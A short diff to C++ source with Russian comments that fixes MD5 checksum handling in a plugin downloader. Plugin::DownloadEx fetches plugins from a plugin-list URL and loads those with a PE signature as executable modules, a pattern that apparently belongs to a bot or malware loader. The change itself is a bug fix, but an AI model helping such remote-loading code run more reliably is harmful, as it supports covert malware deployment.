@@ -616,9 +616,9 @@ LPBYTE Plugin::Decode(LPBYTE Buffer, DWORD BufferSize, bool IsExecutable, DWORD 
 
 //---------------------------------------------------------------------------
 
-char* CalcMd5SummForBuffer(const void* data, DWORD size, char* buffer, DWORD buffer_size)
+char* CalcMd5SummForBuffer(const void* data, DWORD size, char* md5buffer, DWORD md5buffer_size)
 {
-	if (buffer_size < 33) return NULL;
+	if (md5buffer_size < 33) return NULL;
 
 	BYTE    summ[16];
 	MD5_CTX ctx;
@@ -628,15 +628,15 @@ char* CalcMd5SummForBuffer(const void* data, DWORD size, char* buffer, DWORD buf
 
 	MD5Final(summ, &ctx);
 
-	m_memset(buffer, 0, 33);
+	m_memset(md5buffer, 0, md5buffer_size);
 
 	char hexval[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
 	for (int j = 0; j < ARRAYSIZE(summ); j++)
 	{
-		buffer[j*2] = hexval[((summ[j] >> 4) & 0x0F)];
-		buffer[(j*2) + 1] = hexval[(summ[j]) & 0x0F];
+		md5buffer[j*2] = hexval[((summ[j] >> 4) & 0x0F)];
+		md5buffer[(j*2) + 1] = hexval[(summ[j]) & 0x0F];
 	}
-	return buffer;
+	return md5buffer;
 }
 
 //---------------------------------------------------------------------------
@@ -708,6 +708,9 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 		// выставлен флаг "IsExecutable" и присланный файл действительно имеет PE 
 		// сигнатуру
 
+		char CalculatedMd5[40];
+		CalcMd5SummForBuffer(Buffer, BufSize, CalculatedMd5, sizeof(CalculatedMd5));
+
 		LPBYTE Module = NULL;
 
 		if (!IsExecutable || !IsExecutableFile(Buffer))
@@ -725,8 +728,6 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 		// Если контрольная сумма не совпала - пробуем подгрузить всё заново.
 		if (ReceivedMd5 != NULL && Module != NULL)
 		{
-			char CalculatedMd5[40];
-			CalcMd5SummForBuffer(Module, BufSize, CalculatedMd5, sizeof(CalculatedMd5));
 			DWORD Md5CompareResult = m_lstrncmp(ReceivedMd5, CalculatedMd5, 32);
 
 			PDBG("Plugins", "DownloadEx: r_md5='%s' c_md5='%s' cmp_result=%d.", 
